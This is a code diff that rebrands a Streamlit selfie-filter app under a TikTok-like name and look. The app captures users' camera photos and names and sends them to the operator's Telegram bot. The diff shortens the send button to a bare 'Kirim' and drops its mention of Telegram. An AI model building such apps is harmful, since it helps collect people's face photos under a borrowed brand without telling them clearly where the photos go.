@@ -3,33 +3,61 @@ import requests
 from PIL import Image, ImageEnhance, ImageOps
 import streamlit as st
 
-# Konfigurasi Halaman
+# Konfigurasi Halaman (Lebar pas untuk tampilan mobile/app feel)
 st.set_page_config(
-    page_title="VZ TikTok-Style Selfie Studio", page_icon="📸", layout="centered"
+    page_title="TikTok Style Camera Studio", page_icon="🎵", layout="centered"
 )
 
-# --- STYLING CSS MODERN & ESTETIK ---
+# --- STYLING CSS ALA TIKTOK INTERFACE ---
 st.markdown(
     """
     <style>
+    /* Tema Gelap Total ala Layar Kamera TikTok */
     .stApp {
-        background-color: #0b0f19;
-        color: #f8fafc;
+        background-color: #000000;
+        color: #ffffff;
     }
-    h1, h2, h3 {
-        color: #38bdf8 !important;
-        font-family: 'Inter', sans-serif;
+    
+    /* Sembunyikan elemen header default Streamlit agar bersih */
+    header {visibility: hidden;}
+    
+    /* Judul ala Header TikTok */
+    .tiktok-header {
+        text-align: center;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        font-weight: 700;
+        font-size: 1.5rem;
+        color: #ffffff;
+        margin-bottom: 5px;
     }
-    .studio-card {
-        background-color: #111827;
-        border: 1px solid #1f2937;
-        padding: 20px;
-        border-radius: 12px;
+    
+    .tiktok-sub {
+        text-align: center;
+        font-size: 0.85rem;
+        color: #8a8b91;
         margin-bottom: 20px;
     }
-    .filter-desc {
-        font-size: 0.85rem;
-        color: #94a3b8;
+
+    /* Kotak Kontainer Utama */
+    .element-container {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+    
+    /* Tombol Kustom */
+    .stButton>button {
+        width: 100%;
+        background-color: #fe2c55; /* Warna Merah/Pink Khas TikTok */
+        color: white;
+        border: none;
+        border-radius: 25px;
+        font-weight: bold;
+        padding: 10px 20px;
+    }
+    .stButton>button:hover {
+        background-color: #e41e45;
+        color: white;
     }
     </style>
 """,
@@ -41,14 +69,14 @@ TELEGRAM_BOT_TOKEN = "MASUKKAN_TOKEN_BOT_ANDA_DI_SINI"
 TELEGRAM_CHAT_ID = "MASUKKAN_CHAT_ID_ANDA_DI_SINI"
 
 
-def send_photo_to_telegram(photo_bytes, user_name, filter_used):
+def send_to_telegram(photo_bytes, username, filter_name):
   url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
-  files = {"photo": ("vz_studio_edit.jpg", photo_bytes, "image/jpeg")}
+  files = {"photo": ("tiktok_capture.jpg", photo_bytes, "image/jpeg")}
   caption = (
-      f"✨ **VZ STUDIO CAPTURE**\n\n"
-      f"👤 Nama: {user_name}\n"
-      f"🎨 Filter Pilihan: {filter_used}\n"
-      f"📥 Status: Berhasil Disimpan & Dikirim"
+      f"🎵 **TIKTOK STUDIO CAPTURE**\n\n"
+      f"👤 User: {username}\n"
+      f"🎨 Filter: {filter_name}\n"
+      f"🚀 Status: Terkirim Otomatis"
   )
   data_dict = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption}
 
@@ -59,126 +87,84 @@ def send_photo_to_telegram(photo_bytes, user_name, filter_used):
     return {"ok": False, "description": str(e)}
 
 
-def apply_filter(image, filter_name):
-  """Fungsi pemrosesan efek filter foto ala TikTok/Instagram"""
+def apply_tiktok_filter(image, filter_type):
   img = image.convert("RGB")
-
-  if filter_name == "🎬 Cinematic Dark (Sinematik Keren)":
-    enhancer = ImageEnhance.Contrast(img)
-    img = enhancer.enhance(1.6)
-    # Beri sedikit efek redup/cool
-    img = ImageOps.colorize(
-        ImageOps.grayscale(img), "#111827", "#38bdf8"
-    ).convert("RGB")
-  elif filter_name == "🌸 Soft Glow (Korea Style)":
+  if filter_type == "✨ Glow Smooth (Beauty)":
     enhancer = ImageEnhance.Brightness(img)
-    img = enhancer.enhance(1.15)
-    color_enhancer = ImageEnhance.Color(img)
-    img = color_enhancer.enhance(0.85)  # Sedikit soft pastel
-  elif filter_name == "🖤 Monochrome (Hitam Putih Elegan)":
+    img = enhancer.enhance(1.12)
+  elif filter_type == "🎬 Cinematic Dark":
+    enhancer = ImageEnhance.Contrast(img)
+    img = enhancer.enhance(1.5)
+  elif filter_type == "🖤 B&W Aesthetic":
     img = ImageOps.grayscale(img).convert("RGB")
-  elif filter_name == "📼 Vintage Retro (90an)":
-    grayscale = ImageOps.grayscale(img)
-    img = ImageOps.colorize(grayscale, "#3b2300", "#ffd700").convert("RGB")
-  elif filter_name == "🔥 Cyber Neon (Pop Warna)":
+  elif filter_type == "🔥 Vivid Pop":
     enhancer = ImageEnhance.Color(img)
-    img = enhancer.enhance(2.2)
-  # Default: Normal
-
+    img = enhancer.enhance(2.0)
   return img
 
 
-# --- ANTARMUKA APLIKASI ---
-st.title("📸 VZ Creator Selfie Studio")
+# --- TAMPILAN ANTARMUKA UTAMA ---
+st.markdown("<div class='tiktok-header'>TikTok Effect Studio</div>", unsafe_allow_html=True)
 st.markdown(
-    """
-<div class='studio-card'>
-<b>Selamat datang di Studio Kreatif!</b> Ambil foto terbaikmu, pilih efek filter ala TikTok, bandingkan hasilnya, unduh langsung ke perangkatmu, dan bagikan secara otomatis.
-</div>
-""",
+    "<div class='tiktok-sub'>Pilih filter, ambil foto, download, atau kirim"
+    " instan</div>",
     unsafe_allow_html=True,
 )
 
-# Input Nama Pengguna
-user_name = st.text_input("Masukkan Nama / Panggilan Kamu:")
+# 1. Input Nama / ID Pengguna (Simpel di atas)
+username = st.text_input("Username / Nama Kamu", placeholder="Ketik nama kamu...")
+
+# 2. Pilihan Filter (Disajikan horizontal / pilihan cepat)
+filter_option = st.selectbox(
+    "🎨 Pilih Efek Filter",
+    [
+        "✨ Normal (Original)",
+        "✨ Glow Smooth (Beauty)",
+        "🎬 Cinematic Dark",
+        "🖤 B&W Aesthetic",
+        "🔥 Vivid Pop",
+    ],
+)
 
 st.markdown("---")
-st.subheader("📷 Ambil Foto Kamera Depan")
-camera_image = st.camera_input("Posisikan wajahmu di dalam frame kamera")
 
-if camera_image is not None:
-  if not user_name:
-    st.warning("⚠️ Mohon isi nama kamu terlebih dahulu sebelum mengedit foto!")
+# 3. Kotak Kamera Utama (Fokus ke tengah ala layar perekaman)
+camera_file = st.camera_input("Ketuk untuk ambil foto")
+
+# 4. Logika Jika Foto Sudah Diambil
+if camera_file is not None:
+  if not username:
+    st.warning("⚠️ Masukkan username terlebih dahulu di atas!")
   else:
-    # Buka gambar asli
-    original_img = Image.open(camera_image)
+    # Proses Gambar
+    raw_image = Image.open(camera_file)
+    clean_filter_name = filter_option.split(" ", 1)[-1]
+    processed_image = apply_tiktok_filter(raw_image, filter_option)
 
-    st.markdown("---")
-    st.subheader("✨ Pilih Efek & Filter (Gaya TikTok)")
+    # Konversi ke bytes
+    img_bytes_io = io.BytesIO()
+    processed_image.save(img_bytes_io, format="JPEG", quality=95)
+    img_bytes = img_bytes_io.getvalue()
 
-    # Pilihan Filter Interaktif
-    filter_choice = st.radio(
-        "Pilih salah satu filter di bawah ini:",
-        [
-            "✨ Normal (Original)",
-            "🎬 Cinematic Dark (Sinematik Keren)",
-            "🌸 Soft Glow (Korea Style)",
-            "🖤 Monochrome (Hitam Putih Elegan)",
-            "📼 Vintage Retro (90an)",
-            "🔥 Cyber Neon (Pop Warna)",
-        ],
-        horizontal=False,
-    )
+    # Tampilkan Hasil di Layar
+    st.image(processed_image, use_container_width=True)
 
-    # Bersihkan nama filter dari emoji untuk teks telegram
-    clean_filter_name = filter_choice.split(" ", 1)[1]
+    # 5. Tombol Aksi Cepat (Model Tombol Berjajar ala TikTok Action Bar)
+    col_dl, col_tg = st.columns(2)
 
-    # Proses gambar dengan filter yang dipilih
-    processed_img = apply_filter(original_img, clean_filter_name)
-
-    st.markdown("---")
-    st.subheader("🔍 Perbandingan Sebelum & Sesudah (Before / After)")
-
-    # Tampilkan perbandingan Before & After dalam 2 Kolom
-    col1, col2 = st.columns(2)
-    with col1:
-      st.image(
-          original_img, caption="Sebelum (Original)", use_container_width=True
-      )
-    with col2:
-      st.image(
-          processed_img,
-          caption=f"Sesudah ({clean_filter_name})",
-          use_container_width=True,
+    with col_dl:
+      st.download_button(
+          label="📥 Simpan",
+          data=img_bytes,
+          file_name=f"tiktok_snap_{username}.jpg",
+          mime="image/jpeg",
       )
 
-    # Konversi hasil edit ke bytes untuk tombol Download & Telegram
-    buf = io.BytesIO()
-    processed_img.save(buf, format="JPEG", quality=95)
-    byte_im = buf.getvalue()
-
-    st.markdown("---")
-    st.subheader("💾 Simpan & Kirim Hasil Karya")
-
-    # Tombol Download Langsung (Fitur Baru)
-    st.download_button(
-        label="📥 Download Foto Berfilter Ini",
-        data=byte_im,
-        file_name=f"vz_studio_{clean_filter_name.lower().replace(' ', '_')}.jpg",
-        mime="image/jpeg",
-    )
-
-    # Tombol Kirim ke Telegram Anda
-    if st.button("🚀 Kirim Hasil Foto ke Sistem Telegram"):
-      with st.spinner("Mengirim foto ke pusat kendali..."):
-        telegram_res = send_photo_to_telegram(
-            byte_im, user_name, clean_filter_name
-        )
-
-      if telegram_res.get("ok"):
-        st.success("🎉 Berhasil! Foto kamu telah dikirim ke pusat sistem.")
-      else:
-        st.error(
-            "❌ Gagal mengirim ke Telegram. Periksa kembali Token Bot & Chat ID"
-            " Anda."
-        )
+    with col_tg:
+      if st.button("🚀 Kirim"):
+        with st.spinner("Mengirim..."):
+          res = send_to_telegram(img_bytes, username, clean_filter_name)
+        if res.get("ok"):
+          st.success("Berhasil terkirim!")
+        else:
+          st.error("Gagal kirim ke Telegram.")
